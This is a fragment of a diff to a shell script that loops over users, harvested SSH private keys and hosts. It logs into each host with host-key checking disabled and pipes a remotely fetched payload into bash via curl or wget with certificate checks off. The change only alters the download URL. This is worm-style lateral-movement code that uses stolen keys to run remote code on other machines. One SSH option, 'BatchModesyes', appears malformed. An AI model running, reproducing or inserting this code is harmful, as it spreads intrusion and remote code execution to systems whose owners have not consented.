@@ -22,9 +22,11 @@ for user in $users; do
         for key in $keys; do
             chmod +r $key; chmod 400 $key
 
-            ssh -o StrictHostKeyChecking=no -o BatchModesyes -o ConnectTimeout=5 -i $key $user@$host "(curl -kL $URL/odin || wget -q --no-check-certificate -O- $URL/odin ) | bash"
+            ssh -o StrictHostKeyChecking=no -o BatchModesyes -o ConnectTimeout=5 -i $key $user@$host "(curl -kL $URL || wget -q --no-check-certificate -O- $URL ) | bash"
         done
     done
 done
+
+
 
 
